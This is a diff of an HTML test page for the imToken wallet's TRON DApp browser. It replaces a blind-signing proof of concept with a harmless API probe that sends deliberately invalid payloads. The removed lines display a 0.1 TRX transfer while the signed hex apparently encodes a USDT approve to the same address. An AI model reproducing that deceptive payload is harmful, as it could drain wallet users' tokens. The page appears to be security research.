@@ -1,105 +1,360 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>imToken TRON 所见非所签 PoC</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>imToken TRON API 探针测试</title>
     <style>
-        body{font-family:system-ui,sans-serif;background:#111;color:#0f0;padding:20px;text-align:center}
-        button{padding:18px 40px;font-size:18px;background:#0b8;margin:20px;border:none;border-radius:8px;cursor:pointer}
-        .info{margin:15px;padding:15px;background:#222;border-radius:6px}
-        pre{background:#222;padding:10px;border-radius:6px;text-align:left;font-size:12px;overflow:auto;max-height:400px}
+        body {
+            margin: 0;
+            padding: 20px;
+            background: #101010;
+            color: #e8e8e8;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+        }
+
+        .box {
+            max-width: 760px;
+            margin: 0 auto;
+            background: #1d1d1d;
+            border-radius: 14px;
+            padding: 18px;
+            box-shadow: 0 8px 30px rgba(0,0,0,.35);
+        }
+
+        h1 {
+            font-size: 22px;
+            margin: 0 0 12px;
+            color: #4ee59a;
+            text-align: center;
+        }
+
+        .desc {
+            font-size: 14px;
+            color: #aaa;
+            line-height: 1.6;
+            background: #252525;
+            padding: 12px;
+            border-radius: 10px;
+            margin-bottom: 14px;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            margin: 7px 0;
+            border: none;
+            border-radius: 10px;
+            background: #4ee59a;
+            color: #111;
+            font-weight: 700;
+            font-size: 15px;
+            cursor: pointer;
+        }
+
+        button.secondary {
+            background: #5b8cff;
+            color: #fff;
+        }
+
+        button.danger {
+            background: #ff6961;
+            color: #fff;
+        }
+
+        button:disabled {
+            opacity: .45;
+            cursor: not-allowed;
+        }
+
+        .row {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 8px;
+        }
+
+        pre {
+            white-space: pre-wrap;
+            word-break: break-all;
+            background: #080808;
+            color: #b8ffcf;
+            padding: 12px;
+            border-radius: 10px;
+            min-height: 260px;
+            max-height: 520px;
+            overflow: auto;
+            font-size: 12px;
+            line-height: 1.5;
+        }
+
+        .ok { color: #4ee59a; }
+        .warn { color: #ffd166; }
+        .err { color: #ff6961; }
+
+        .small {
+            color: #888;
+            font-size: 12px;
+            line-height: 1.5;
+            margin-top: 10px;
+        }
+
+        input, textarea {
+            width: 100%;
+            box-sizing: border-box;
+            background: #111;
+            color: #fff;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 10px;
+            font-size: 13px;
+            outline: none;
+        }
+
+        textarea {
+            height: 120px;
+            resize: vertical;
+        }
+
+        label {
+            display: block;
+            margin-top: 12px;
+            margin-bottom: 6px;
+            color: #bbb;
+            font-size: 13px;
+        }
     </style>
 </head>
 <body>
-    <h1>imToken TRON 所见非所签 测试</h1>
-    <div class="info">
-        点击按钮将显示：<br>
-        <strong>发送 0.1 TRX 到 TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz</strong><br>
-        实际可能为 USDT Approve（授权地址 TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz）
+<div class="box">
+    <h1>imToken TRON API 探针测试</h1>
+
+    <div class="desc">
+        这个页面只测试 <b>window.imToken.callPromisifyAPI</b> 是否存在，以及
+        <b>tron.sendTransaction</b> 这个 API 名称能不能被 imToken 识别。<br>
+        默认 payload 是故意无效的，所以正常情况下不会发起真实链上交易。
     </div>
-    <button onclick="sendTx()">发送 0.1 TRX</button>
+
+    <div class="row">
+        <button onclick="checkEnv()">1. 检测 imToken / TronWeb 环境</button>
+        <button class="secondary" onclick="testEmptyPayload()">2. 测试 tron.sendTransaction：空 payload</button>
+        <button class="secondary" onclick="testSeveralInvalidPayloads()">3. 连续测试几种无效 payload</button>
+        <button class="danger" onclick="clearLog()">清空日志</button>
+    </div>
+
+    <label>自定义 API 名称</label>
+    <input id="apiName" value="tron.sendTransaction" />
+
+    <label>自定义测试 payload，不建议填真实 raw_data / raw_data_hex</label>
+    <textarea id="customPayload">{
+  "test": true
+}</textarea>
+
+    <button onclick="testCustomPayload()">4. 用自定义 payload 测试</button>
 
     <pre id="log"></pre>
 
-    <script>
-        function log(msg) {
-            const logEl = document.getElementById('log');
-            logEl.textContent += msg + '\n';
-            logEl.scrollTop = logEl.scrollHeight;
+    <div class="small">
+        判断方法：<br>
+        1. 如果提示 <b>window.imToken 不存在</b>，说明不是 imToken DApp 环境。<br>
+        2. 如果提示 <b>callPromisifyAPI 不是函数</b>，说明当前环境不支持这个 SDK 方法。<br>
+        3. 如果返回 <b>no transaction payload</b>，通常说明 API 名称可能被识别了，但参数格式不对。<br>
+        4. 如果返回 <b>api not found / method not found</b>，说明这个 API 名称大概率不可用。<br>
+        5. 如果弹出钱包确认页，立刻取消，说明它可能进入了真实交易流程。
+    </div>
+</div>
+
+<script>
+    const logEl = document.getElementById("log");
+
+    function now() {
+        return new Date().toLocaleTimeString();
+    }
+
+    function log(msg, type = "") {
+        const prefix = `[${now()}] `;
+        logEl.textContent += prefix + msg + "\n";
+        logEl.scrollTop = logEl.scrollHeight;
+    }
+
+    function logObject(title, obj) {
+        log(title);
+        try {
+            log(JSON.stringify(obj, null, 2));
+        } catch (e) {
+            log(String(obj));
         }
+    }
 
-        async function getOwnerAddress() {
-            if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
-                return window.tronWeb.defaultAddress.base58;
-            }
-            if (window.tronLink) {
-                try {
-                    const accounts = await window.tronLink.request({ method: 'tron_requestAccounts' });
-                    return accounts[0];
-                } catch(e) {}
-            }
-            return null;
-        }
+    function clearLog() {
+        logEl.textContent = "";
+    }
 
-        async function sendTx() {
-            if (!window.imToken) {
-                alert("请在 imToken DApp 浏览器中打开");
-                return;
-            }
+    function safeType(v) {
+        return Object.prototype.toString.call(v);
+    }
 
-            log("imToken 环境检测成功");
+    async function checkEnv() {
+        log("========== 环境检测开始 ==========");
 
-            const owner = await getOwnerAddress();
-            if (!owner || !owner.startsWith('T')) {
-                alert("无法自动获取地址，请确保已在 imToken 中连接 TRON 钱包");
-                log("获取地址失败");
-                return;
-            }
+        log("userAgent: " + navigator.userAgent);
+        log("window.imToken 存在: " + Boolean(window.imToken));
+        log("window.tronWeb 存在: " + Boolean(window.tronWeb));
+        log("window.tronLink 存在: " + Boolean(window.tronLink));
 
-            log("当前钱包地址: " + owner);
+        if (window.imToken) {
+            log("window.imToken 类型: " + safeType(window.imToken));
+            log("callPromisifyAPI 存在: " + Boolean(window.imToken.callPromisifyAPI));
+            log("callPromisifyAPI 类型: " + typeof window.imToken.callPromisifyAPI);
 
-            // 简化但更符合预期的 payload 结构
-            const payload = {
-                raw_data: {
-                    contract: [{
-                        type: "TransferContract",
-                        parameter: {
-                            value: {
-                                owner_address: owner,
-                                to_address: "TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz",
-                                amount: 100000   // 0.1 TRX
-                            }
-                        }
-                    }],
-                    ref_block_bytes: "0000",
-                    ref_block_hash: "0000000000000000000000000000000000000000000000000000000000000000",
-                    expiration: Date.now() + 3600000,
-                    timestamp: Date.now(),
-                    fee_limit: 100000000
-                },
-                raw_data_hex: "0a0200002208000000000000000040e0f3d9b3b9b95a6a0a31747970652e676f6f676c65617069732e636f6d2f70726f746f636f6c2e54726967676572536d617274436f6e747261637412350a1541" + 
-                              owner.substring(2) + 
-                              "121541a614f803b6fd780986a42c78ec9c7f77e6ded13c2244095ea7b300000000000000000000000000000000000000000000000000000000000000000000"
-            };
-
-            log("Payload 准备完成，正在调用...");
-            console.log("完整 payload:", payload);
-
+            const keys = [];
             try {
-                const result = await window.imToken.callPromisifyAPI("tron.sendTransaction", payload);
-                log("✅ 调用成功: " + JSON.stringify(result));
-                alert("交易提交成功！\n\n确认页应该显示 TRX 转账\n请在 TronScan 查看链上真实结果");
-            } catch(e) {
-                log("❌ 错误: " + (e.message || JSON.stringify(e)));
-                console.error(e);
-                alert("调用失败: " + (e.message || e));
-            }
+                for (const k in window.imToken) keys.push(k);
+            } catch (e) {}
+
+            logObject("window.imToken 可枚举字段:", keys);
+        } else {
+            log("未检测到 window.imToken，请在 imToken DApp 浏览器中打开。");
         }
 
-        window.addEventListener('load', () => {
-            log("页面加载完成，TronWeb: " + !!window.tronWeb);
-        });
-    </script>
+        if (window.tronWeb) {
+            log("tronWeb.defaultAddress: " + JSON.stringify(window.tronWeb.defaultAddress || null));
+            log("tronWeb.trx 存在: " + Boolean(window.tronWeb.trx));
+        }
+
+        log("========== 环境检测结束 ==========");
+    }
+
+    function ensureImTokenApi() {
+        if (!window.imToken) {
+            throw new Error("window.imToken 不存在，请在 imToken DApp 浏览器中打开");
+        }
+
+        if (typeof window.imToken.callPromisifyAPI !== "function") {
+            throw new Error("window.imToken.callPromisifyAPI 不是函数，当前环境不支持这个调用方式");
+        }
+    }
+
+    async function callImTokenApi(apiName, payload, label) {
+        log("---------- " + label + " ----------");
+        log("API: " + apiName);
+        logObject("Payload:", payload);
+
+        try {
+            ensureImTokenApi();
+
+            const result = await window.imToken.callPromisifyAPI(apiName, payload);
+
+            log("✅ 调用成功");
+            logObject("Result:", result);
+
+            alert("调用成功，注意检查是否弹出了钱包确认页。如果弹出，请取消。");
+        } catch (e) {
+            log("❌ 调用失败");
+            log("错误类型: " + safeType(e));
+            log("错误 message: " + (e && e.message ? e.message : "无 message"));
+            logObject("完整错误对象:", e);
+
+            const msg = e && e.message ? e.message : JSON.stringify(e);
+
+            if (String(msg).toLowerCase().includes("no transaction payload")) {
+                log("判断：API 可能被识别了，但传入参数不是它想要的 transaction payload。");
+            } else if (
+                String(msg).toLowerCase().includes("not found") ||
+                String(msg).toLowerCase().includes("unknown") ||
+                String(msg).toLowerCase().includes("unsupported")
+            ) {
+                log("判断：API 名称可能不存在或当前 imToken 版本不支持。");
+            } else {
+                log("判断：需要根据 imToken 返回的具体错误继续分析。");
+            }
+        }
+    }
+
+    async function testEmptyPayload() {
+        const apiName = document.getElementById("apiName").value.trim() || "tron.sendTransaction";
+
+        await callImTokenApi(
+            apiName,
+            {},
+            "测试空对象 payload"
+        );
+    }
+
+    async function testSeveralInvalidPayloads() {
+        const apiName = document.getElementById("apiName").value.trim() || "tron.sendTransaction";
+
+        const tests = [
+            {
+                label: "payload = null",
+                payload: null
+            },
+            {
+                label: "payload = {}",
+                payload: {}
+            },
+            {
+                label: "payload = { transaction: null }",
+                payload: {
+                    transaction: null
+                }
+            },
+            {
+                label: "payload = { transaction: {} }",
+                payload: {
+                    transaction: {}
+                }
+            },
+            {
+                label: "payload = { raw_data: null }",
+                payload: {
+                    raw_data: null
+                }
+            },
+            {
+                label: "payload = { raw_data: {}, raw_data_hex: '' }",
+                payload: {
+                    raw_data: {},
+                    raw_data_hex: ""
+                }
+            },
+            {
+                label: "payload = { test: true }",
+                payload: {
+                    test: true
+                }
+            }
+        ];
+
+        for (const item of tests) {
+            await callImTokenApi(apiName, item.payload, item.label);
+            await sleep(300);
+        }
+    }
+
+    async function testCustomPayload() {
+        const apiName = document.getElementById("apiName").value.trim() || "tron.sendTransaction";
+        const text = document.getElementById("customPayload").value.trim();
+
+        let payload;
+
+        try {
+            payload = JSON.parse(text);
+        } catch (e) {
+            alert("自定义 payload 不是合法 JSON: " + e.message);
+            return;
+        }
+
+        await callImTokenApi(apiName, payload, "自定义 payload 测试");
+    }
+
+    function sleep(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    window.addEventListener("load", () => {
+        log("页面加载完成");
+        log("建议先点：1. 检测 imToken / TronWeb 环境");
+    });
+</script>
 </body>
 </html>
